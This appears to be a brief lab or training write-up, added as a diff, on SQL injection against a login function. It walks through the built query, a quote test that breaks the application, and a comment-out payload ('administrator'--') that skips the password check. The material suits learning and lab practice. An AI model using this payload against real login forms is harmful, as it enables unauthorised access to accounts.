@@ -1,0 +1,14 @@
+SQL Injection in the login function
+
+Goal: log in as the administrator user.
+
+Analysis
+--------
+
+SELECT firstname FROM users WHERE username='admin' AND password='admin'
+
+SELECT firstname FROM users WHERE username=''' AND password='admin', caused the application to break.
+
+SELECT firstname FROM users WHERE username='administrator'--' AND password='admin'
+
+SELECT firstname FROM users WHERE username='administrator'
